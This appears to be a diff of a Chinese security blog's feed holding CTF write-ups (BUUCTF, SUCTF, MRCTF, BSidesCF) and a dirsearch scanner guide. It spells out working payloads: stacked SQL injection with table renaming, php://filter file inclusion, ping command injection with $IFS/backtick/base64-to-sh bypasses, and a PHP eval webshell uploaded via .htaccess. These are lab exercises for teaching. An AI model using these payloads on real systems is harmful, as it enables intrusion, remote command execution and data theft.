-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2.猜解SQL查询语句中的字段数</p>
-<p>输入1’ order by 3 # 回显出错，说明有两个字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>3.显示字段</p>
-<p>输入1′ union select 1,2 # 回显一个正则过滤规则</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
-
-<p>过滤了 select，update，delete，drop，insert，where 和 点</p>
-<p>过滤了这么多词，尝试堆叠注入</p>
-<p>4.查询数据库</p>
-<p>输入1’;show databases;# 成功回显</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>说明存在堆叠注入</p>
-<p>5.查询表</p>
-<p>输入1’;show tables;# 成功回显</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到两个表words和1919810931114514</p>
-<p>6.查询表中字段</p>
-<p>查看1919810931114514，输入1’; show columns from <code>1919810931114514</code>; #</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到1919810931114514中有我们想要的flag字段</p>
-<p>7.查询另一个表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名</p>
-<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。然后程序查询就能查询到原本‘1919810931114514’表中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br><span class="line">#rename命令用于修改表名。</span><br><span class="line">#rename命令格式：rename table 原表名 to 新表名;</span><br><span class="line">#alert修改字段名及字段属性值</span><br><span class="line">alert table 表名 change 旧字段名 新字段名 新字段属性; </span><br></pre></td></tr></table></figure>
-
-<p>输入1’ or 1&#x3D;’1,查询就得到flag</p>
-<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>打开页面只有一个a标签的超链接，指向的是?file&#x3D;flag.php。结合题目的名称不难联想到这是一题文件包含的题目。</p>
-<pre><code>看到当?file=flag.php时，页面返回Can you find out the flag。先输入?file=/etc/passwd，确认一下有没有返回，是否真的有文件包含的漏洞。
-</code></pre>
-<p>看到确实存在文件包含漏洞，目前又没有其他的信息。我们不知道真正的flag藏在那个页面中。所以只能先用文件包含漏洞中php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource伪协议帮我们返回已知页面的代码。输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>就能得到index.php的源代码的base64密文。解密后得到一下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>大概意思就是过滤了php的几个伪协议，但刚好没过滤我们这个。<br>所以可以我们可以看到返回的结果<br>那现在就取一下flag.php的内容</p>
-<p> 输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php就能得到flag.php的源代码的base64密文。解密后得到一下内容里面就有flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;ace2c6ad-88d7-4c5d-a49e-38baeba72c32&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>打开题目就看到大大的PING,二话不说直接ping个本地ip</p>
-<p>涉及知识点：</p>
-<pre><code>在命令执行的过程中，可以通过一些常用特殊字符来执行其他语句
-
-；  //命令分割符，即当执行完第一个命令，继续执行下一个命令
-
-|   //管道
-</code></pre>
-<p>那么尝试在当前文件夹下，有什么东西吧</p>
-<p>构造payload</p>
-<pre><code> 127.0.0.1;ls
-</code></pre>
-<p> 我们都知道在linux系统搭建的页面，通常显示页面的路径是&#x2F;var&#x2F;www&#x2F;html，那么我们尝试返回当前路径查找</p>
-<p>构造payload</p>
-<pre><code> 127.0.0.1;cd ../../../;ls
-</code></pre>
-<p>在返回前三层的时候找到了flag 字样</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
-
-<p>构造payload</p>
-<pre><code>127.0.0.1;cd ../../../;cat flag
-</code></pre>
-<p>flag{977043da-6f7d-4f7a-9e8e-2c65837cb657}</p>
-<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>（1）页面里显示&#x2F;?ip&#x3D;,很明显要以ping的形式传一个参数给ip，并且我们要想执行其他命令，就要用命令分隔符也就是管道符连接，命令分隔符可以用”;“”|“”&amp;”三种，本题经过尝试发现第一步查看目录过滤了|，&amp;和空格。<br>这里介绍两种方式：<br>1.ping本地127.0.0.1<br>2.用||来代替127.0.0.1；<br>（2）虽然找到了放flag的文件，但是尝试后发现都不对，这里介绍一种思路，我们可以通过查看index.php的文件源码来查看源码，从而确认过滤了哪些东西，题目说过滤了命令连接符&amp;，\，空格，*，bash，&lt;&gt;，flag，？，我们得想一些其他方法来绕过<br>（3）要想得到flag了，我们需要绕过过滤掉的东西<br>这里介绍三种可以解决的特殊绕过方式：<br>1.拼接绕过法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>以上是题目给的绕过flag的源码，我们这里需要知道这是正则表达式匹配了ip的值中是否顺序出现了f、l、a、g四个字母。这样一来我们就可以拼接一个flag来绕过了，可以拼接f;lag fl;ag fla;g 但是这里需要注意：本题特殊就特殊在flag的字母顺序要不同（拼接绕过的一个大坑）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=g;x=fla;$x$y</span><br><span class="line">y=ag;x=fl;$x$y</span><br><span class="line">y=lag;x=f;$x$y</span><br></pre></td></tr></table></figure>
-
-<p>构造payload：&#x2F;?ip&#x3D;||y&#x3D;ag;x&#x3D;fl;cat$IFS$9$x$y.php跑一下查看源码得到flag</p>
-<p>2.内联执行法<br>可以看到代码没有过滤掉符号&#96; 所以可以利用内联执行的方式直接打开flag文件,先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload 跑一下，查看源码拿到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$6`ls`或者/?ip=||cat$IFS$6`ls`</span><br></pre></td></tr></table></figure>
-
-<p>3.sh编码绕过法(base64编码)</p>
-<p>使用方法：echo 命令编码|base64 -d|sh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh可以换成bash, 但是题目过滤掉了</span><br><span class="line">也可以换成其他的编码形式，这里用base64的</span><br><span class="line">空格用$IFS$6替换掉</span><br><span class="line">cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>
-
-<p>构造payload ， 相当于执行命令cat flag.php,查看源码得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br><span class="line">/?ip=||echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br></pre></td></tr></table></figure>
-
-<h1 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h1><p>1.试试sql注入正常套路<br>（1）先试试1有回显<br>（2）再试试字母a没有回显<br>（3）试试单引号注入<code>1&#39; or &#39;1&#39;=&#39;1</code>,提示不一样，因此猜测这里有注入点<br>（4）试试有多少列,<code>1&#39; order by 4#</code>,还是不成功，因此一般的联合查询在这里不能使用<br>（5）基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注,<code>1&#39; and length(database())&gt;=1</code>还是不成功<br>2.利用堆叠注入<br>（1）查找所有数据库,1;show databases;#</p>
-<p>（2）查询所有表名,1;show tables;#</p>
-<p>（3）查询Flag表中的列,1;show columns from Flag#,不成功<br>3.接下来是网上的两种解法<br>（1）第一种是猜出了源码<strong>select $_POST[‘query’] || flag from Flag</strong>,<br>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
-<p>因此只需要将<br>$_POST[‘query’]</p>
-<p>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql&#x3D;select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为  *,1</p>
-<p>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
-<p>执行payload：<code>*,1</code>,得到flag<br>（2）第二种是将||作为字符串连接符，因此需要在语句中更改其配置<br>sql_mode&#x3D;PIPES_AS_CONCAT时即可<br>Payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>拼接完之后：select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>相当于是select 1 from Flag和select flag from Flag,得到flag</p>
-<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>先看一下题目,有注入点，这里怀疑是SQL注入</p>
-<p>先尝试读取一下index.php</p>
-<p>这里使用php伪协议</p>
-<p>payload：</p>
-<p>php:&#x2F;&#x2F;filter:&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
-<p>存在文件包含漏洞，但是这里报错了，分析之后是无法打开流：操作失败</p>
-<p>这里去除php后缀</p>
-<p>payload</p>
-<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171203176.png" alt="image-20230805171203176"></p>
-<p>解码之后找到index.php</p>
-<pre><code>&lt;?php
-                $file = $_GET[&#39;category&#39;];
-
-                if(isset($file))
-                &#123;
-                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
-                        include ($file . &#39;.php&#39;);
-                    &#125;
-                    else&#123;
-                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
-                    &#125;
-                &#125;
-                ?&gt;
-</code></pre>
-<p>传入的category参数必须有woofers,meowers,index才行</p>
-<p>这里构造payload来包含flag.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?category=woofers/../flag</span><br></pre></td></tr></table></figure>
-
-<p>这里使用的知识点是php:&#x2F;&#x2F;filter伪协议套协议</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171429538.png" alt="image-20230805171429538"></p>
-<p>base64解码得CTF{happiness_needs_no_filters}</p>
-]]></content>
-      <tags>
-        <tag>ctf解题</tag>
       </tags>
   </entry>
   <entry>
@@ -2999,6 +2700,42 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
 ]]></content>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dirsearch</title>
+    <url>/2023/08/15/dirsearch/</url>
+    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>
+
+<p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
+<p>相比其他扫描工具disearch的特点是：</p>
+<pre><code>支持HTTP代理
+多线程
+支持多种形式的网页（asp,php）
+生成报告（纯文本，JSON）
+启发式检测无效的网页
+递归扫描
+用户代理随机化
+批量处理
+扫描器与字典（注：字典必须是文本文件）
+</code></pre>
+<p>下载及安装<br> 要求:python 3.7或更高版本 </p>
+<pre><code>其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 
+</code></pre>
+<h1 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h1><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
+<p>目前版本是更新到0.42。</p>
+<h1 id="3-下载到本地，安装使用"><a href="#3-下载到本地，安装使用" class="headerlink" title="3.下载到本地，安装使用"></a>3.下载到本地，安装使用</h1><p>pip3 install -r requirements.txt     &#x2F;&#x2F;安装依赖包</p>
+<p>下载超时了，找国内镜像。如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
+
+<p>python3 setup.py install</p>
+<h1 id="4-使用命令"><a href="#4-使用命令" class="headerlink" title="4.使用命令"></a>4.使用命令</h1><p>常用命令<br>–version            显示dirsearch的版本<br>-h –help            帮助提示<br>-u  –url            指定网址<br>-e                   指定网站语言<br>-w                   指定字典<br>-r                   递归目录（跑出目录后，继续跑目录下面的目录）<br>-l  –url-list&#x3D;FILE  目标url文件路径<br>-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)<br>-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
+<p>简单使用<br>&#x2F;&#x2F;简单的使用方法<br>python3 dirsearch.py -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;使用文件拓展名为php和txt以及js的字典扫描目标<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -w &#x2F;path&#x2F;to&#x2F;wordlist<br>&#x2F;&#x2F;采用递归扫描<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r<br>&#x2F;&#x2F;采用递归扫描 递归层数为三层<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r -R 3</p>
+]]></content>
+      <tags>
+        <tag>安全工具</tag>
       </tags>
   </entry>
   <entry>
@@ -3332,6 +3069,305 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
       </tags>
   </entry>
   <entry>
+    <title>buuctf</title>
+    <url>/2023/08/08/buuctf/</url>
+    <content><![CDATA[<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><span id="more"></span>
+
+<p>1、后缀名不能有ph！对于文件后缀名的限制，无法绕过这里<br>2、上传类型也太露骨了吧！对Content-Type的限制，修改为image&#x2F;jpeg即可绕过<br>3、诶，别蒙我啊，这标志明显还是php啊</p>
+<p>对上传文件的内容进行了检测，不能含有&lt;?，这里的PHP版本为：PHP&#x2F;5.6.23，可以使用 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;111&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是搭建到蚁剑上连接不成功</p>
+<p>上传一个.htaccess文件将别的后缀名文件内容解析为php程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .mochu</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165204744.png" alt="image-20230805165204744"></p>
+<p>然后上传shell即可</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165102425.png" alt="image-20230805165102425"></p>
+<p>用蚁剑创建数据</p>
+<p>找到根目录下的flag</p>
+<p>![屏幕截图 2023-08-05 150602](D:\Users\陈\Pictures\Screenshots\屏幕截图 2023-08-05 150602.png)</p>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开靶机是一串代码<br>因为html 渲染过程中是不会把\n当做回车展示的，所以右键查看源代码，瞬间舒服了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>按行显示的题目代码“代码审计”<br>读代码可知拿到flag只需要满足俩条件：<br>1.让以get方式传参的两个变量gg和id满足md5后的值强比较相等，本身的值弱比较不相等<br>2.以post方式传参的变量password不是数字并且与数字1234567弱比较相等<br>由此，在url后追加?id[]&#x3D;1&amp;gg[]&#x3D;2就可以显示“You got the first step”的提示。但passwd参数还没有传，此时需要借助浏览器插件HackBar以post方式传入passwd&#x3D;1234567a<br>以get方式传参并使md5值相等<br>总结：<br>1.给数组类型的变量赋值不同的数值，可以满足变量的md5值在进行强比较时相等，又满足他们自身的值在进行弱比较时不相等。<br>2.在数字后面加个字母，就不再是数字但又可以满足和数字做弱比较时相等。</p>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题目的名字一看就能猜到应该是文件上传了<br>打开靶机链接是这个样子的，我不知道这是什么梗<br>题目网页<br>因为类似的题上一篇已经写过了，这里就简写。这道题也是只能上传非php后缀的文件，然后再上传.htaccess文件，使服务器端将jpg看做php。<br>上传jpg格式的一句话木马：<br>一句话木马</p>
+<p>上传.htaccess时拦截包，修改文件类型为image&#x2F;jpeg：<br>上传.htaccess文件<br>.htaccess里写的内容：SetHandler application&#x2F;x-httpd-php</p>
+<p>上传1.jpg和.htaccess成功后，就可以用中国蚁剑连接了<br>url地址是：靶机的url&#x2F;upload&#x2F;随机生成的一串数&#x2F;1.jpg（即一句话木马文件上传到的路径）<br>密码是写在1.jpg里的111<br>测试连接，显示连接成功，点击添加，在服务器端的根目录可以找到flag</p>
+<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title="htaccess是什么"></a>htaccess是什么</h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config</p>
+<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>访问url</p>
+<p>重命名+堆叠注入</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>输入1’发现不回显</p>
+<p>输入1’#显示正常</p>
+<p>应该是存在sql注入了</p>
+<p>输入1’ or ‘1’&#x3D;’1,正常回显，应该是字符型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.猜解SQL查询语句中的字段数</p>
+<p>输入1’ order by 3 # 回显出错，说明有两个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>3.显示字段</p>
+<p>输入1′ union select 1,2 # 回显一个正则过滤规则</p>
